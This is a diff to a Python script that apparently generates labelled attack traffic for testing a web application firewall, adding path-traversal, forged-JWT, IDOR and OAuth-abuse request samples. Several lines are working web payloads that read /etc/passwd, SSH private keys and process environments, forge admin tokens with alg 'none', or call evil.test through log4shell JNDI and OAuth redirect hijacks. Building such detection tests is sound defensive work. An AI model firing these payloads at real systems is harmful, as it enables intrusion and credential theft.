@@ -605,6 +605,63 @@ def main() -> None:
     for i, p in enumerate(jwt_paths):
         add("jwt_abuse", f"10.0.1.{v4_last(10 + i)}", "GET", p)
 
+    # 2026 — path traversal varyantlari (cift encode, wrapper, null)
+    pt_variant_paths = [
+        "/static?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "/download?path=..%252f..%252f..%252fetc%252fpasswd",
+        "/asset?url=....//....//....//etc/passwd",
+        "/read?f=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+        "/view?doc=..\\..\\..\\windows\\win.ini",
+        "/include?page=....//....//etc/passwd%00.jpg",
+        "/files?p=..;/..;/etc/passwd",
+        "/media?src=zip://../../etc/passwd",
+        "/export?path=file:///etc/passwd%23",
+        "/load?template=..%5c..%5c..%5cetc%5cpasswd",
+        "/api/fs?path=....//....//proc/self/environ",
+        "/backup?dir=%2e%2e%2f%2e%2e%2froot%2f.ssh%2fid_rsa",
+        "/theme?file=php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
+        "/img?src=..%2f..%2f..%2fvar%2flog%2fauth.log",
+        "/doc?f=..%25252f..%25252fetc%25252fpasswd",
+    ]
+    for i, p in enumerate(pt_variant_paths):
+        add("path_traversal_variant", f"192.0.2.{v4_last(140 + i)}", "GET", p)
+
+    # JWT alg confusion / kid injection (jwt_abuse'dan ayri — alg tespiti)
+    jwt_alg_paths = [
+        "/api/me?token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+        "/auth?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
+        "/api/v1/user?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
+        "/oauth/verify?token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.evil",
+        "/api/session?bearer=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19hZG1pbiI6dHJ1ZX0.evil",
+        "/gateway?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
+        "/api/protected?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.",
+        "/sso/callback?access=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzY29wZSI6ImFkbWluIn0.",
+        "/api/v2/me?jwt=eyJhbGciOiJIUzI1NiJ9.eyJncm91cCI6ImFkbWluIn0.",
+        "/login/sso?token=eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic3VwZXJhZG1pbiJ9.",
+        "/api/account?bearer=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InJvb3QifQ.",
+        "/auth/verify?jwt=eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.",
+    ]
+    for i, p in enumerate(jwt_alg_paths):
+        add("jwt_alg_confusion", f"10.0.2.{v4_last(10 + i)}", "GET", p)
+
+    # API BOLA/IDOR — OpenAPI strict prod senaryolari
+    api_bola_paths = [
+        "/api/v1/users/2/profile?as_user=1",
+        "/api/v1/orders/99?account_id=1",
+        "/api/v1/invoices/42/download?owner=admin",
+        "/api/v1/files/7?user_id=other",
+        "/api/v1/tenants/2/settings?tenant_id=1",
+        "/api/v1/wallet/55/transfer?from_account=1",
+        "/api/v1/messages/12/read?recipient=admin",
+        "/api/v1/subscriptions/3/cancel?customer=2",
+        "/api/v1/keys/9/rotate?scope=admin",
+        "/api/v1/reports/export?user=2&filter=all",
+        "/api/v1/billing/invoice/88?org=other",
+        "/api/v1/projects/5/members?add_role=admin",
+    ]
+    for i, p in enumerate(api_bola_paths):
+        add("api_bola", f"10.0.3.{v4_last(10 + i)}", "GET", p)
+
     redirect_paths = [
         "/redirect?url=http://evil.test/phish",
         "/login?next=//evil.test/admin",
@@ -699,6 +756,25 @@ def main() -> None:
     ]
     for i, p in enumerate(enterprise_ognl_paths):
         add("enterprise_ognl", f"203.0.122.{v4_last(10 + i)}", "GET", p)
+
+    # OAuth 2.0 / OIDC abuse — redirect_uri hijack, PKCE downgrade, implicit flow
+    # Ham form: waf_rules.c oauth_abuse_patterns
+    oauth_abuse_paths = [
+        "/oauth/authorize?redirect_uri=https://evil.test/callback",
+        "/oauth/authorize?redirect_uri=//evil.test/oauth/cb",
+        "/oauth/authorize?response_type=token&redirect_uri=https://evil.test",
+        "/oauth/token?grant_type=password&username=admin&password=x",
+        "/oauth/token?grant_type=client_credentials&client_id=leaked",
+        "/oauth/authorize?code_challenge_method=plain&code_challenge=x",
+        "/openid/connect/authorize?redirect_uri=http://evil.test/sso",
+        "/oauth/authorize?client_id=app&redirect_uri=https://evil.test/x",
+        "/oauth/token?grant_type=client&client_secret=leak",
+        "/oauth/callback?redirect_uri=//evil.test/path",
+        "/sso/oauth?response_type=token&redirect_uri=https://evil.test",
+        "/api/oauth/authorize?redirect_uri=http://evil.test/cb",
+    ]
+    for i, p in enumerate(oauth_abuse_paths):
+        add("oauth_abuse", f"203.0.124.{v4_last(10 + i)}", "GET", p)
 
     # RFI — waf_rules.c rfi_patterns (php://, data://, remote include)
     rfi_paths = [
@@ -1018,8 +1094,12 @@ def main() -> None:
         ("nosql", "GET", "/api/users?filter[$gt]={}", UA_NORMAL),
         ("prototype_pollution", "GET", "/api/obj?__proto__[n]={}", UA_NORMAL),
         ("jwt_abuse", "GET", "/api/me?token=eyJhbGciOiJub25lIn0.evil{}", UA_NORMAL),
+        ("jwt_alg_confusion", "GET", "/auth?jwt=eyJhbGciOiJub25lIn0.eyJhZG1pbiI6e30.{}", UA_NORMAL),
+        ("path_traversal_variant", "GET", "/file?p=%2e%2e%2fetc%2fpasswd%2f{}", UA_NORMAL),
+        ("api_bola", "GET", "/api/v1/records/{}?owner=other", UA_NORMAL),
         ("log4shell", "GET", "/api?q=${{jndi:ldap://evil.test/{}}}", UA_NORMAL),
         ("open_redirect", "GET", "/redirect?url=//evil.test/{}", UA_NORMAL),
+        ("oauth_abuse", "GET", "/oauth/authorize?redirect_uri=https://evil.test/{}", UA_NORMAL),
         ("crlf", "GET", "/go?u=ok%0d%0aX-Evil:{}", UA_NORMAL),
         ("webshell", "GET", "/upload/shell{}.php", 403, UA_SCAN),
         ("xxe", "GET", "/parse?xml=%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E&n={}", UA_NORMAL),
